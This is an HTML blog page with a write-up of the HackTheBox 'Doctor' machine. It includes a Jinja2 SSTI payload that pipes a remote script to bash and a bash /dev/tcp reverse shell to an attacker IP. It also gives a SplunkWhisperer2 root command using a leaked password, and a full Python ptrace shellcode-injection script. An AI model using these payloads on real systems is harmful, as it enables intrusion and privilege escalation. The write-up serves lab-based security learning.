@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Doctor Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Doctor Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Doctor Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Doctor is a Linux based machine that was active since September 26th of 2020 to February 6th of 2021, we will start this machine creating an account on its site and finding a SSTI vulnerability where the results are not reflected on the same page that we inject our payload, after testing it a little bit we find out that it is running Jinja2 and search for a payload that gets us code execution so we can spawn a reverse shell, after that we find out that there is a backup of apache logs where we find the password of a user on the machine, this user uses the same password to access to splunkd, which we can use to get code execution as root and finish with the machine, after that we discuss a little bit about how would be possible to get root abusing of python3 which has a special capability set." />
+<meta property="og:description" content="Doctor is a Linux based machine that was active since September 26th of 2020 to February 6th of 2021, we will start this machine creating an account on its site and finding a SSTI vulnerability where the results are not reflected on the same page that we inject our payload, after testing it a little bit we find out that it is running Jinja2 and search for a payload that gets us code execution so we can spawn a reverse shell, after that we find out that there is a backup of apache logs where we find the password of a user on the machine, this user uses the same password to access to splunkd, which we can use to get code execution as root and finish with the machine, after that we discuss a little bit about how would be possible to get root abusing of python3 which has a special capability set." />
+<link rel="canonical" href="http://localhost:8000/Doctor" />
+<meta property="og:url" content="http://localhost:8000/Doctor" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/doctor/doctor.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-06T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/doctor/doctor.png" />
+<meta property="twitter:title" content="Doctor Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-02-06T00:00:00-05:00","datePublished":"2021-02-06T00:00:00-05:00","description":"Doctor is a Linux based machine that was active since September 26th of 2020 to February 6th of 2021, we will start this machine creating an account on its site and finding a SSTI vulnerability where the results are not reflected on the same page that we inject our payload, after testing it a little bit we find out that it is running Jinja2 and search for a payload that gets us code execution so we can spawn a reverse shell, after that we find out that there is a backup of apache logs where we find the password of a user on the machine, this user uses the same password to access to splunkd, which we can use to get code execution as root and finish with the machine, after that we discuss a little bit about how would be possible to get root abusing of python3 which has a special capability set.","headline":"Doctor Writeup [HTB]","image":"http://localhost:8000/assets/images/doctor/doctor.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Doctor"},"url":"http://localhost:8000/Doctor"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/doctor/doctor.png/../banner.png>
+  
+  <h2>Doctor Writeup [HTB]</h2>
+  <time datetime="2021-02-06T00:00:00-05:00" class="by-line">06 Feb 2021</time>
+  <p>Doctor is a Linux based machine that was active since September 26th of 2020 to February 6th of 2021, we will start this machine creating an account on its site and finding a SSTI vulnerability where the results are not reflected on the same page that we inject our payload, after testing it a little bit we find out that it is running Jinja2 and search for a payload that gets us code execution so we can spawn a reverse shell, after that we find out that there is a backup of apache logs where we find the password of a user on the machine, this user uses the same password to access to splunkd, which we can use to get code execution as root and finish with the machine, after that we discuss a little bit about how would be possible to get root abusing of python3 which has a special capability set.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.209
+nmap -sC -sV -p 80,8089,22, -Pn -o scan.txt 10.10.10.209
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache/2.4.41 (Ubuntu)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>We see three open port, ssh, a webpage and splunkd, so we start checking the webpage.</p>
+
+<p><img src="/assets/images/doctor/webpage.png" alt="" /></p>
+
+<p>There we see a mail addresses to “doctors.htb”, so we add that to our hosts file and access to the site, that gets us another webpage.</p>
+
+<p><img src="/assets/images/doctor/doctorspage.png" alt="" /></p>
+
+<p>It is a login page, we don’t need to find valid credentials since we can register an account.</p>
+
+<p><img src="/assets/images/doctor/register.png" alt="" /></p>
+
+<p>With that we access to a simple panel.</p>
+
+<p><img src="/assets/images/doctor/panel.png" alt="" /></p>
+
+<p>We use feroxbuster to find any hidden file or directory, <code class="language-plaintext highlighter-rouge">feroxbuster -u http://doctors.htb -x txt,html,php</code></p>
+
+<p><img src="/assets/images/doctor/feroxbuster.png" alt="" /></p>
+
+<p>We find “archive”, and we get to blank page, but if we check the source code we see some xml text, anyways it doesn’t show any relevant information.</p>
+
+<p><img src="/assets/images/doctor/archive.png" alt="" /></p>
+
+<p>Going back to the panel we test the “New Message” function, and create a simple message.</p>
+
+<p><img src="/assets/images/doctor/message.png" alt="" /></p>
+
+<p>Now if we go back to “archive” que see that the title is reflected there.</p>
+
+<p><img src="/assets/images/doctor/archive2.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>Since saw xml the most obvious vulnerability would be XXE, but it didn’t work, testing other kinds of vulnerabilities we get to Server Side Template Injection, so we find a <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">guide</a> to start our testing, but there are a bunch of different template engines, so we need to narrow down some options, Wappalyzer or whatweb can help us with that, if we check Wappalyzer we see that the site is running under Python.</p>
+
+<p><img src="/assets/images/doctor/wappalyzer.png" alt="" /></p>
+
+<p>We start our test an put “{{7*7}}” as the title of a message.</p>
+
+<p><img src="/assets/images/doctor/sttitest.png" alt="" /></p>
+
+<p>And checking the xml.</p>
+
+<p><img src="/assets/images/doctor/sttixml.png" alt="" /></p>
+
+<p>Yes, we got it executed, now according to the guide the template engine should be Tornado, since Jinja2 would have thrown an error, but if we test with {{foobar}} it shows nothing, and in Tornado this should give an error, so we can’t say for sure which one of these engines are being used,but let’s remember the output of Wappalyzer, it not only said Python but also Flask, Jinja2 runs under Flask, so we can guess that we are actually dealing with Jinja2. Searching for information we get to this <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">blog</a> where we see a poc to get code execution on Jinja2, sending a reverse shell code through http is annoying since encoding and decoding usually mess up everything, so what I like to do is curl a reverse shell code and pipe it to bash, so first we create a file named “shell.sh” with our reverse shell code inside, start a python http server, <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>, and our nc listener, then we create a message with the title <code class="language-plaintext highlighter-rouge">\{\{request.application.__globals__.__builtins__.__import__('os').popen('curl http://10.10.15.13:8000/shell.sh | bash').read()\}\}</code> (erase the “\” at the start and the end, jekyll was having some problems with it), and when we open http://doctors.htb/archive we get a request on our http server and a shell on the machine.</p>
+
+<p><img src="/assets/images/doctor/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-1"></a>Lateral Movement</h1>
+
+<p>Now the next part was really hard for me, but we just need to throw linpeas and read carefully every single line of its output until we see that there is a backup under “/var/log/apache2” (actually the image of the machine had a hint for it) that we can read, there we find the password of “shaun”, “Guitar123”. And with that we get the “user.txt”.</p>
+
+<p><img src="/assets/images/doctor/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Now we go back to our port scan, there is a port that we haven’t touch, splunkd is running on the port 8089, serching about it we find that there is a <a href="https://github.com/cnotin/SplunkWhisperer2">RCE script</a> that would allow us to get code execution as root on the machine, so we clone the repository, then using the shell that we have on the machine we create a directory called “.empty” under “/tmp”, and inside there a file named “shell” that will contain a reverse shell code inside, <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.15.13/54322 0&gt;&amp;1</code>. After we had set up a listener for the conection we execute the script to get a shell, <code class="language-plaintext highlighter-rouge">python PySplunkWhisperer2_remote.py --host 10.10.10.209 --user shaun --password Guitar123 --payload-file shell.sh --payload "bash /tmp/.empty/shell" --lhost 10.10.15.13</code>, we specify the user and password of splunkd, payload-file is just the name under the script will be executed, payload will read the file and execute what is there, and lhost is our machine where a deployement application will be hold and serve the malicious app, so we execute it.</p>
+
+<p><img src="/assets/images/doctor/splunkwhisperer.png" alt="" /></p>
+
+<p>And with that we receive a shell as root and finish with the machine.</p>
+
+<p><img src="/assets/images/doctor/shell3.png" alt="" /></p>
+
+<h1 id="possible-privilege-escalation-method"><a href="#header-1"></a>Possible Privilege Escalation Method</h1>
+
+<p>As I mentioned finding the password of “shaun” was really annoying, so first I tried another approach, I saw that python3 had <code class="language-plaintext highlighter-rouge">cap_sys_ptrace+ep</code> set.</p>
+
+<p><img src="/assets/images/doctor/getcap.png" alt="" /></p>
+
+<p>I had learnt from Pentester Academy that is possible to use this to get proccess injection as root, so I tried that, <a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">here</a> is its blog showing how to do that, but the example is for python2 so we have to tweak it a bit so it works with python3, we just have to change the shellcode to bytes and some encoding methods, resulting in:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
+# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
+</span>
+<span class="kn">import</span> <span class="n">ctypes</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">struct</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="c1"># Macros defined in &lt;sys/ptrace.h&gt;
+# https://code.woboq.org/qt5/include/sys/ptrace.h.html
+</span>
+<span class="n">PTRACE_POKETEXT</span>   <span class="o">=</span> <span class="mi">4</span>
+<span class="n">PTRACE_GETREGS</span>	<span class="o">=</span> <span class="mi">12</span>
+<span class="n">PTRACE_SETREGS</span>	<span class="o">=</span> <span class="mi">13</span>
+<span class="n">PTRACE_ATTACH</span> 	<span class="o">=</span> <span class="mi">16</span>
+<span class="n">PTRACE_DETACH</span> 	<span class="o">=</span> <span class="mi">17</span>
+
+<span class="c1"># Structure defined in &lt;sys/user.h&gt;
+# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
+</span>
+<span class="k">class</span> <span class="nc">user_regs_struct</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">Structure</span><span class="p">):</span>
+	<span class="n">_fields_</span> <span class="o">=</span> <span class="p">[</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r15</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r14</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r13</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r12</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rbp</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rbx</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r11</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r10</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r9</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">r8</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rax</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rcx</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rdx</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rsi</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rdi</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">orig_rax</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rip</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">cs</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">eflags</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">rsp</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">ss</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">fs_base</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">gs_base</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">ds</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">es</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">fs</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+    	<span class="p">(</span><span class="sh">"</span><span class="s">gs</span><span class="sh">"</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulonglong</span><span class="p">),</span>
+	<span class="p">]</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nc">CDLL</span><span class="p">(</span><span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">pid</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="c1"># Define argument type and respone type.
+</span><span class="n">libc</span><span class="p">.</span><span class="n">ptrace</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_uint64</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_uint64</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">]</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">ptrace</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_uint64</span>
+<span class="c1">#time.sleep(1)
+# Attach to the process
+</span><span class="n">libc</span><span class="p">.</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+<span class="n">registers</span><span class="o">=</span><span class="nf">user_regs_struct</span><span class="p">()</span>
+<span class="c1">#time.sleep(1)
+# Retrieve the value stored in registers
+</span><span class="n">libc</span><span class="p">.</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">byref</span><span class="p">(</span><span class="n">registers</span><span class="p">))</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Instruction Pointer: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="p">))</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injecting Shellcode at: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="p">))</span>
+
+<span class="c1"># Shell code copied from exploit db.
+</span><span class="n">shellcode</span><span class="o">=</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05</span><span class="sh">"</span>
+<span class="c1">#print (type(shellcode))
+# Inject the shellcode into the running process byte by byte.
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="mi">4</span><span class="p">):</span>
+ 
+  <span class="c1"># Convert the byte to little endian.
+#  print (shellcode[i:4+i].hex())
+</span>  <span class="n">shellcode_byte_int</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">i</span><span class="p">].</span><span class="nf">hex</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#  print (str(shellcode_byte_int).encode('utf-8'))
+</span>  <span class="n">shellcode_byte_little_endian</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">shellcode_byte_int</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>
+<span class="c1">#  print (shellcode_byte_little_endian)
+</span>  <span class="n">shellcode_byte</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">shellcode_byte_little_endian</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+ 
+  <span class="c1"># Inject the byte.
+</span>  <span class="n">libc</span><span class="p">.</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_void_p</span><span class="p">(</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="o">+</span><span class="n">i</span><span class="p">),</span><span class="n">shellcode_byte</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Shellcode Injected!!</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Modify the instuction pointer
+</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="o">=</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="o">+</span><span class="mi">2</span>
+
+<span class="c1"># Set the registers
+</span><span class="n">libc</span><span class="p">.</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">byref</span><span class="p">(</span><span class="n">registers</span><span class="p">))</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Final Instruction Pointer: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">registers</span><span class="p">.</span><span class="n">rip</span><span class="p">))</span>
+
+<span class="c1"># Detach from the process.
+</span><span class="n">libc</span><span class="p">.</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
+</code></pre></div></div>
+
+<p>So to test if this works we add the capabilities to python3 on our machine <code class="language-plaintext highlighter-rouge">sudo setcap cap_sys_ptrace+ep /usr/bin/python3.8</code> (note that this may change if your machine has python located in another place), then we start a proccess as root, I started a nc listener and got its PID.</p>
+
+<p><img src="/assets/images/doctor/ncpid.png" alt="" /></p>
+
+<p>Its PID is “35254”, so now we execute our process injector.</p>
+
+<p><img src="/assets/images/doctor/injection.png" alt="" /></p>
+
+<p>So now we can connect to the port 5600 and get a shell with root privileges.</p>
+
+<p><img src="/assets/images/doctor/5600shell.png" alt="" /></p>
+
+<p>It worked! Now lets try this on the target machine, we pick any proccess running as root and execute our injector, but as we see it fails.</p>
+
+<p><img src="/assets/images/doctor/injectfail.png" alt="" /></p>
+
+<p>Even locally the injector isn’t 100% reliable, it works around 70% of the time, but doesn’t matter how many times we try this on the target machine we can’t make it work, so probably there is another kind of measure that doesn’t allow us to get it to work, if you want to now more <a href="https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/">here</a> is an awesome blog explaining more about the subject, I’ve seen on the forum that some people have been able to get root using python so if I find any writeup pointing to how to do it I’ll edit this post and link it :)</p>
+
+<p><a href="https://shishirsubedi.com.np/htb/doctor/">Here</a> is a writeup who were able to priv esc using python3, rather than “fixing” the code so it works in python3 he hardcodes some values on it, I try it and for some reason it didn’t work for me… But since he managed to make it work it’s probably a more relialable way.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#server-side-template-injection"> Server Side Template Injection</a> &nbsp;
+  
+  <a href="/tags.html#splunkd"> Splunkd</a> &nbsp;
+  
+  <a href="/tags.html#python"> Python</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
